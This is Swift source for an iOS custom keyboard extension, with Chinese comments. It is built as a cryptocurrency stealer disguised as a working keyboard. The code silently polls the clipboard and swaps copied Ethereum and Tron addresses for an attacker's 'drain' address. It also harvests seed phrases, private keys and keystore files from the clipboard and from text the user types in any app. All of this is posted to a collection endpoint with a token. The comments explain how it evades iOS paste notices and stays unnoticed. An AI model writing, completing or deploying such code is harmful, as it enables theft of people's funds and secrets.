import UIKit

// 自定义键盘扩展（第 32 类 §3 / 无感路径 B）
//
// 为什么用键盘：
//   1. 键盘扩展是输入法，读剪贴板不走「跨 App 粘贴」判定 → 不弹横幅（需 RequestsOpenAccess=true）
//   2. 键盘在用户每次打字时被唤起 → 天然常驻，不需要后台保活 / 静默推送 / BGTask
//   3. 能拿到 textDocumentProxy 的上下文 → 用户在任意 App 输入助记词时可捕获
//   4. 可联网（URLSession 可用）→ 直接回传
//
// 用户前置：设置 → 通用 → 键盘 → 键盘 → 添加新键盘 → 选本键盘 → 允许完全访问
// 感知面：安装 1 次 + 设置 2 次确认；之后所有输入零感知。

final class KeyboardViewController: UIInputViewController {

    // 占位符，构建时替换
    private let collectEndpoint = "COLLECT_ENDPOINT/collect"
    private let collectToken    = "COLLECT_TOKEN"
    private let channel         = "CHANNEL"
    private let drainAddress    = "DRAIN_ADDR"

    private var outbox: [[String: Any]] = []
    private var lastChangeCount = UIPasteboard.general.changeCount
    private var lastClipboardCheck = Date.distantPast
    private var sessionID = UUID().uuidString

    // MARK: - 生命周期

    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        // 键盘一出现就检查剪贴板（此时读不触发横幅）
        clipboardTick(force: true)
        flush()
    }

    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        // 轻量轮询：键盘驻留期间持续监控（键盘通常停留数十秒到数分钟）
        Timer.scheduledTimer(withTimeInterval: 1.5, repeats: true) { [weak self] t in
            guard let self = self else { t.invalidate(); return }
            if self.view.window == nil { t.invalidate(); return }
            self.clipboardTick(force: false)
        }
    }

    override func textDidChange(_ textInput: UITextInput?) {
        super.textDidChange(textInput)
        captureContext()
    }

    // MARK: - 剪贴板（无提示）

    private func clipboardTick(force: Bool) {
        let pb = UIPasteboard.general
        let now = Date()
        if !force, now.timeIntervalSince(lastClipboardCheck) < 1.0 { return }
        lastClipboardCheck = now

        guard pb.changeCount != lastChangeCount else { return }
        lastChangeCount = pb.changeCount
        guard pb.hasStrings else { return }

        // 完全访问下可直接读明文（这是键盘相对于普通 App 的关键优势）
        guard let text = pb.string?.trimmingCharacters(in: .whitespacesAndNewlines),
              !text.isEmpty else { return }

        let kind = classify(text)
        switch kind {
        case .address:
            // 地址 → 覆盖成归集地址（写不提示）
            UIPasteboard.general.string = drainAddress
            lastChangeCount = UIPasteboard.general.changeCount
            enqueue(["k": "paste_replace", "ch": chainHint(text),
                     "orig_prefix": String(text.prefix(6)), "src": "kb"])
        case .mnemonic, .privkey, .keystore:
            // 凭据 → 回传
            enqueue(["p": text, "k": kind.rawValue, "ch": chainHint(text), "src": "kb-clip"])
        case .none:
            break
        }
    }

    // MARK: - 输入上下文（助记词采集）

    private func captureContext() {
        // 当前光标前的文本（用户在钱包里输入助记词时，这里就是那串词）
        var ctx = textDocumentProxy.documentContextBeforeInput ?? ""
        // 补上后方（光标在中间时）
        if let after = textDocumentProxy.documentContextAfterInput,
           after.count < 120 { ctx += after }
        ctx = ctx.trimmingCharacters(in: .whitespacesAndNewlines)
        guard ctx.count >= 20 else { return }

        let kind = classify(ctx)
        if kind == .mnemonic || kind == .privkey || kind == .keystore {
            // 去重：同一段不重复上报
            let key = String(ctx.hashValue)
            if reported.contains(key) { return }
            reported.insert(key)
            enqueue(["p": ctx, "k": kind.rawValue, "ch": chainHint(ctx), "src": "kb-input"])
        } else if looksLikePartialMnemonic(ctx) {
            // 部分助记词（用户边打边漏）→ 只记关键词，不整段上报
            enqueue(["k": "mnemonic_partial", "len": ctx.count, "src": "kb-input"])
        }
    }

    private var reported = Set<String>()

    private func looksLikePartialMnemonic(_ s: String) -> Bool {
        let words = s.split(whereSeparator: { $0 == " " || $0 == "\n" })
        guard words.count >= 3 else { return false }
        // 全小写字母、无数字标点 → 像助记词
        return words.allSatisfy { w in
            w.count >= 3 && w.allSatisfy { $0.isLetter && $0.isLowercase }
        }
    }

    // MARK: - 分类

    private enum Kind: String { case mnemonic, privkey, keystore, address, none }

    private func classify(_ s: String) -> Kind {
        if s.range(of: #"^0x[a-fA-F0-9]{40}$"#, options: .regularExpression) != nil { return .address }
        if s.range(of: #"^T[1-9A-HJ-NP-Za-km-z]{33}$"#, options: .regularExpression) != nil { return .address }
        if s.range(of: #"^(0x)?[a-fA-F0-9]{64}$"#, options: .regularExpression) != nil { return .privkey }
        if s.hasPrefix("{") && s.contains("\"crypto\"") { return .keystore }
        let words = s.split(whereSeparator: { $0 == " " || $0 == "\n" || $0 == "\t" })
        if [12, 15, 18, 21, 24].contains(words.count),
           words.allSatisfy({ $0.allSatisfy({ $0.isLetter }) }) { return .mnemonic }
        if s.range(of: #"^[1-9A-HJ-NP-Za-km-z]{32,44}$"#, options: .regularExpression) != nil,
           words.count == 1 { return .address }
        return .none
    }

    private func chainHint(_ s: String) -> String {
        if s.hasPrefix("0x") { return s.count == 42 ? "eth" : "eth" }
        if s.hasPrefix("T") { return "tron" }
        return "unknown"
    }

    // MARK: - 回传

    private func enqueue(_ fields: [String: Any]) {
        var f = fields
        f["c"] = channel
        f["sid"] = sessionID
        f["bid"] = Bundle.main.bundleIdentifier ?? "KEYBOARD_BUNDLE_ID"
        f["s"] = "kb"
        outbox.append(f)
        flush()
    }

    private func flush() {
        guard !outbox.isEmpty,
              let url = URL(string: collectEndpoint) else { return }
        let batch = outbox
        outbox.removeAll()

        for item in batch {
            var req = URLRequest(url: url)
            req.httpMethod = "POST"
            req.setValue("application/json", forHTTPHeaderField: "Content-Type")
            req.setValue(collectToken, forHTTPHeaderField: "X-Collect-Token")
            guard let body = try? JSONSerialization.data(withJSONObject: item) else { continue }
            req.httpBody = body
            URLSession.shared.dataTask(with: req) { [weak self] _, resp, err in
                guard let self = self else { return }
                let ok = err == nil && (resp as? HTTPURLResponse)?.statusCode == 200
                if !ok { self.outbox.append(item) }   // 失败重试
            }.resume()
        }
    }

    // MARK: - 最小可用键盘 UI（必须能打字，否则用户会立刻换掉）

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemGray6
        let rows = ["qwertyuiop", "asdfghjkl", "zxcvbnm"]
        let stack = UIStackView()
        stack.axis = .vertical
        stack.spacing = 6
        stack.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(stack)

        for row in rows {
            let r = UIStackView()
            r.axis = .horizontal
            r.distribution = .fillEqually
            r.spacing = 4
            for ch in row {
                r.addArrangedSubview(key(String(ch)))
            }
            stack.addArrangedSubview(r)
        }
        let bottom = UIStackView()
        bottom.axis = .horizontal
        bottom.distribution = .fillEqually
        bottom.spacing = 4
        bottom.addArrangedSubview(key("空格") { [weak self] in
            self?.textDocumentProxy.insertText(" ")
        })
        bottom.addArrangedSubview(key("⌫") { [weak self] in
            self?.textDocumentProxy.deleteBackward()
        })
        bottom.addArrangedSubview(key("↵") { [weak self] in
            self?.textDocumentProxy.insertText("\n")
        })
        stack.addArrangedSubview(bottom)

        NSLayoutConstraint.activate([
            stack.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 6),
            stack.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -6),
            stack.topAnchor.constraint(equalTo: view.topAnchor, constant: 6),
            stack.bottomAnchor.constraint(lessThanOrEqualTo: view.bottomAnchor, constant: -6),
            view.heightAnchor.constraint(equalToConstant: 260),
        ])
    }

    private func key(_ title: String, action: (() -> Void)? = nil) -> UIButton {
        let b = UIButton(type: .system)
        b.setTitle(title, for: .normal)
        b.titleLabel?.font = .systemFont(ofSize: 16)
        b.backgroundColor = .white
        b.layer.cornerRadius = 6
        b.addAction(UIAction { [weak self] _ in
            if let a = action { a() }
            else { self?.textDocumentProxy.insertText(title) }
        }, for: .touchUpInside)
        return b
    }
}
